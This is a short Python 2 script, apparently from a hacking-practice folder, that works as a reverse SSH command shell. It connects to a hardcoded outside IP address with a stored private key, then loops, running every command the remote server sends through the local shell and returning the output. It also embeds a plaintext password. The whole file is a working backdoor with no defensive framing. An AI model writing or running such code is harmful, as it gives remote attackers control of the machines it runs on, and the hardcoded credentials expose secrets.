#!/usr/bin/python2

import threading
import paramiko
import subprocess

def sshRCommand(ip, user, passwd, command):
    try:
        key = paramiko.RSAKey.from_private_key_file("/home/ubuntu/data/PyHack/qCloud")
    except paramiko.PasswordRequiredException:
        pass

    client = paramiko.SSHClient()
    #client.load_host_keys('/home/ubuntu/.ssh/kow')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username = user, pkey = key)
    sshSession = client.get_transport().open_session()
    
    if sshSession.active:
        sshSession.send(command)
        print sshSession.recv(1024)
    
        while True:
            command = sshSession.recv(1024)
            try:
                output = subprocess.check_output(command, shell = True)
                sshSession.send(output)
            except Exception, e:
                sshSession.send(str(e))
        
        client.close()
    
    return

sshRCommand("119.29.148.163", "ubuntu", "lanxia2372615", "ClientConnected")
